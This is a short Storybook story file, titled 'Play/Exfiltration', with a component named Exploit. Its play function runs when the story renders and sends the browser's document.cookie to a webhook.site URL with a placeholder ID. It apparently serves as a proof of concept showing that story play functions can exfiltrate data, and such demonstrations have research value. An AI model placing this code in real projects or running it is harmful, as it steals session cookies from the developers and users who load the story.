export default {
  title: "Play/Exfiltration",
};

export const Exploit = () => <button>Click</button>;

Exploit.play = async () => {
  await fetch("https://webhook.site/YOUR-ID?c=" + document.cookie);
};
